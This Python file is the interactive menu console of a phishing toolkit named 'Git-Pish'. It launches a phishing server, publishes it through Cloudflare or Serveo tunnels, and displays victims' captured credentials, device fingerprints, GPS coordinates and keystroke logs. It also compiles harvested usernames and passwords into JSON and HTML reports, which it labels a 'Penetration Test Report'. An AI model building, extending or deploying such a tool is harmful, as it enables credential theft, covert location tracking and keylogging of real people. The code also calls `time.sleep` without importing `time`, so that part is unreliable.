#!/usr/bin/env python3
# Git-Pish CLI - Interactive Console Version
# Author: xspeen

import os
import sys
import subprocess
import json
from datetime import datetime

# ANSI Colors
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m'

def clear_screen():
    os.system('clear' if os.name != 'nt' else 'cls')

def print_banner():
    print(f"""
{RED}╔══════════════════════════════════════════════════════════════════╗
{RED}║{YELLOW}    ██████╗ ██╗████████╗     ██████╗ ██╗███████╗██╗  ██╗    {RED}║
{RED}║{YELLOW}   ██╔════╝ ██║╚══██╔══╝     ██╔══██╗██║██╔════╝██║  ██║    {RED}║
{RED}║{YELLOW}   ██║  ███╗██║   ██║        ██████╔╝██║███████╗███████║    {RED}║
{RED}║{YELLOW}   ██║   ██║██║   ██║        ██╔═══╝ ██║╚════██║██╔══██║    {RED}║
{RED}║{YELLOW}   ╚██████╔╝██║   ██║        ██║     ██║███████║██║  ██║    {RED}║
{RED}║{YELLOW}    ╚═════╝ ╚═╝   ╚═╝        ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝    {RED}║
{RED}║{CYAN}                      INTERACTIVE CLI v1.0                        {RED}║
{RED}╚══════════════════════════════════════════════════════════════════╝{RESET}
    """)

def show_menu():
    print(f"""
{CYAN}┌─────────────────────────────────────────────────────────────┐
│                      MAIN MENU                                 │
├─────────────────────────────────────────────────────────────┤
│  {GREEN}1{RESET} │ Start Phishing Server (Localhost)                      │
│  {GREEN}2{RESET} │ Start + Cloudflare Tunnel (Auto Public URL)            │
│  {GREEN}3{RESET} │ Start + SSH Tunnel (Serveo)                           │
│  {GREEN}4{RESET} │ View Captured Credentials                             │
│  {GREEN}5{RESET} │ View Device Fingerprints                              │
│  {GREEN}6{RESET} │ View GPS Locations                                    │
│  {GREEN}7{RESET} │ View Keystroke Logs                                   │
│  {GREEN}8{RESET} │ Generate Report (JSON/HTML)                          │
│  {GREEN}9{RESET} │ Clear All Logs                                        │
│  {GREEN}0{RESET} │ Exit                                                  │
└─────────────────────────────────────────────────────────────┘
    """)
    return input(f"{YELLOW}Git-Pish> {RESET}")

def view_credentials():
    clear_screen()
    print_banner()
    print(f"\n{CYAN}╔══════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{CYAN}║{WHITE}                      CAPTURED CREDENTIALS                      {CYAN}║{RESET}")
    print(f"{CYAN}╚══════════════════════════════════════════════════════════════════╝{RESET}\n")

    try:
        with open('logs/credentials.log', 'r') as f:
            lines = f.readlines()
            if lines:
                for line in lines[-20:]:  # Show last 20 entries
                    print(f"  {WHITE}{line.strip()}{RESET}")
            else:
                print(f"  {YELLOW}No credentials captured yet{RESET}")
    except FileNotFoundError:
        print(f"  {YELLOW}No log file found. Start the server first.{RESET}")

    input(f"\n{CYAN}[*] Press Enter to continue...{RESET}")

def view_devices():
    clear_screen()
    print_banner()
    print(f"\n{CYAN}╔══════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{CYAN}║{WHITE}                      DEVICE FINGERPRINTS                       {CYAN}║{RESET}")
    print(f"{CYAN}╚══════════════════════════════════════════════════════════════════╝{RESET}\n")

    try:
        with open('logs/devices.json', 'r') as f:
            lines = f.readlines()
            if lines:
                for line in lines[-5:]:  # Last 5 devices
                    data = json.loads(line.strip())
                    print(f"  {GREEN}IP:{RESET} {data.get('ip', 'N/A')}")
                    print(f"  {GREEN}Time:{RESET} {data.get('timestamp', 'N/A')}")
                    print(f"  {GREEN}User Agent:{RESET} {data.get('userAgent', 'N/A')[:60]}...")
                    print(f"  {GREEN}Screen:{RESET} {data.get('screenWidth', 'N/A')}x{data.get('screenHeight', 'N/A')}")
                    print(f"  {GREEN}Timezone:{RESET} {data.get('timezone', 'N/A')}")
                    print(f"  {CYAN}---{RESET}")
            else:
                print(f"  {YELLOW}No devices captured yet{RESET}")
    except FileNotFoundError:
        print(f"  {YELLOW}No log file found. Start the server first.{RESET}")

    input(f"\n{CYAN}[*] Press Enter to continue...{RESET}")

def view_locations():
    clear_screen()
    print_banner()
    print(f"\n{CYAN}╔══════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{CYAN}║{WHITE}                         GPS LOCATIONS                          {CYAN}║{RESET}")
    print(f"{CYAN}╚══════════════════════════════════════════════════════════════════╝{RESET}\n")

    try:
        with open('logs/locations.txt', 'r') as f:
            lines = f.readlines()
            if lines:
                for line in lines[-10:]:
                    print(f"  {WHITE}{line.strip()}{RESET}")
            else:
                print(f"  {YELLOW}No locations captured yet{RESET}")
    except FileNotFoundError:
        print(f"  {YELLOW}No log file found. Start the server first.{RESET}")

    input(f"\n{CYAN}[*] Press Enter to continue...{RESET}")

def view_keystrokes():
    clear_screen()
    print_banner()
    print(f"\n{CYAN}╔══════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{CYAN}║{WHITE}                       KEYSTROKE LOGS                          {CYAN}║{RESET}")
    print(f"{CYAN}╚══════════════════════════════════════════════════════════════════╝{RESET}\n")

    try:
        with open('logs/keystrokes.log', 'r') as f:
            lines = f.readlines()
            if lines:
                for line in lines[-10:]:
                    print(f"  {WHITE}{line.strip()[:100]}{RESET}")
            else:
                print(f"  {YELLOW}No keystrokes captured yet{RESET}")
    except FileNotFoundError:
        print(f"  {YELLOW}No log file found. Start the server first.{RESET}")

    input(f"\n{CYAN}[*] Press Enter to continue...{RESET}")

def generate_report():
    clear_screen()
    print_banner()
    print(f"\n{CYAN}[*] Generating report...{RESET}")

    os.makedirs('output', exist_ok=True)

    report = {
        'generated_at': datetime.now().isoformat(),
        'tool': 'Git-Pish',
        'credentials': [],
        'devices': [],
        'locations': [],
        'keystrokes': []
    }

    # Load credentials
    try:
        with open('logs/credentials.json', 'r') as f:
            for line in f:
                try:
                    report['credentials'].append(json.loads(line.strip()))
                except:
                    pass
    except:
        pass

    # Load devices
    try:
        with open('logs/devices.json', 'r') as f:
            for line in f:
                try:
                    report['devices'].append(json.loads(line.strip()))
                except:
                    pass
    except:
        pass

    # Load locations
    try:
        with open('logs/locations.json', 'r') as f:
            for line in f:
                try:
                    report['locations'].append(json.loads(line.strip()))
                except:
                    pass
    except:
        pass

    # Save JSON report
    json_file = f"output/report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(json_file, 'w') as f:
        json.dump(report, f, indent=2)

    print(f"{GREEN}[+] JSON report saved: {json_file}{RESET}")

    # Generate HTML report
    html_file = json_file.replace('.json', '.html')
    html_content = f"""<!DOCTYPE html>
<html>
<head><title>Git-Pish Report</title>
<style>
    body {{ font-family: monospace; background: #0d1117; color: #e6edf3; padding: 20px; }}
    h1 {{ color: #2f81f7; }}
    table {{ border-collapse: collapse; width: 100%; }}
    th, td {{ border: 1px solid #30363d; padding: 8px; text-align: left; }}
    th {{ background: #161b22; }}
    .cred {{ color: #3fb950; }}
    .loc {{ color: #d2a8ff; }}
</style>
</head>
<body>
<h1>Git-Pish Penetration Test Report</h1>
<p>Generated: {report['generated_at']}</p>

<h2>Credentials Captured ({len(report['credentials'])})</h2>
<table>
<tr><th>Timestamp</th><th>IP</th><th>Username</th><th>Password</th></tr>
"""
    for cred in report['credentials'][-50:]:
        html_content += f"<tr><td>{cred.get('timestamp', '')}</td><td>{cred.get('ip', '')}</td><td>{cred.get('username', '')}</td><td>{cred.get('password', '')}</td></tr>"

    html_content += f"""
</table>
<h2>Locations ({len(report['locations'])})</h2>
<table>
<tr><th>Timestamp</th><th>IP</th><th>Coordinates</th><th>Maps</th></tr>
"""
    for loc in report['locations'][-20:]:
        lat = loc.get('latitude', '')
        lon = loc.get('longitude', '')
        maps_link = f"https://www.google.com/maps?q={lat},{lon}" if lat and lon else "#"
        html_content += f"<tr><td>{loc.get('timestamp', '')}</td><td>{loc.get('ip', '')}</td><td>{lat},{lon}</td><td><a href='{maps_link}'>View</a></td></tr>"

    html_content += "</table></body></html>"

    with open(html_file, 'w') as f:
        f.write(html_content)

    print(f"{GREEN}[+] HTML report saved: {html_file}{RESET}")
    input(f"\n{CYAN}[*] Press Enter to continue...{RESET}")

def clear_logs():
    clear_screen()
    print_banner()
    confirm = input(f"{RED}[!] Are you sure you want to clear all logs? (yes/no): {RESET}")
    if confirm.lower() == 'yes':
        import shutil
        if os.path.exists('logs'):
            shutil.rmtree('logs')
        os.makedirs('logs', exist_ok=True)
        print(f"{GREEN}[+] All logs cleared!{RESET}")
    else:
        print(f"{YELLOW}[!] Cancelled.{RESET}")
    input(f"\n{CYAN}[*] Press Enter to continue...{RESET}")

def start_server(tunnel=None):
    clear_screen()
    print_banner()

    port = input(f"{CYAN}[?] Enter port (default 8080): {RESET}") or "8080"

    cmd = [sys.executable, 'git-pish.py', '--port', port]

    if tunnel == 'cloudflare':
        cmd.append('--tunnel')
        cmd.append('cloudflare')
    elif tunnel == 'ssh':
        cmd.append('--tunnel')
        cmd.append('ssh')

    print(f"{GREEN}[+] Starting server...{RESET}")
    subprocess.run(cmd)

def main():
    while True:
        clear_screen()
        print_banner()
        choice = show_menu()

        if choice == '1':
            start_server()
        elif choice == '2':
            start_server('cloudflare')
        elif choice == '3':
            start_server('ssh')
        elif choice == '4':
            view_credentials()
        elif choice == '5':
            view_devices()
        elif choice == '6':
            view_locations()
        elif choice == '7':
            view_keystrokes()
        elif choice == '8':
            generate_report()
        elif choice == '9':
            clear_logs()
        elif choice == '0':
            print(f"{RED}[!] Exiting...{RESET}")
            sys.exit(0)
        else:
            print(f"{RED}[!] Invalid choice{RESET}")
            time.sleep(1)

if __name__ == '__main__':
    main()
